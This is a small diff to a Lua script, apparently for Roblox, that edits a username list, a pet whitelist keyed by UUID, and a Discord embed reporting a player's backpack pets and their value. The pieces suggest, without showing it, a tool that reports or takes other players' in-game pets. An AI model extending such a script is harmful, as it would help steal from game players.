@@ -42,8 +42,7 @@ local USERNAMES = {
     "Elaine_Pets20",
     "BEESUYAH"
 }
-    
-}
+   
 
 -- PET whitelist map: pet name => UUID
 local PET_WHITELIST = {
@@ -144,11 +143,7 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
                 ),
                 inline = false
             },
-            {
-                name = "🥀**Total Value**",
-                value = string.format("```%sÂ¢```", totalValue),
-                inline = false
-            },
+          
             {
                 name = "🎒**Backpack**",
                 value = string.format("```%s```", petList),
